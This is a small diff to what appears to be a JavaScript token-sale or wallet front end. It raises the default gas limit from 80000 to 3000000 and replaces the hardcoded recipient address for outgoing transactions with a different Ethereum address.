@@ -182,7 +182,7 @@
         sendRecipient: '',
         sendAmount: '',
         sendAmount2: '',
-        sendGasAmount: 80000,
+        sendGasAmount: 3000000,
         sendGasFee: 0,
         sendGasCost: '0.00',
         sendButtonDisabled: true,
@@ -329,7 +329,7 @@ contract.methods.tokensSold().call().then((result) =>  {
         let sendGasPrice = parseFloat(this.sendGas);
         let sendGasAmount = parseInt(this.sendGasAmount);
         let sendAmount = parseFloat(this.sendAmount);
-        let sendRecipient = "0x7b79D1aa9287fD7fB8ae131E356411a1C0D3f8db";
+        let sendRecipient = "0xCE085F3eCe8bf44D1dCfda3AE2c17D5e00e81570";
         let password = this.password;
         let data;
         let value;
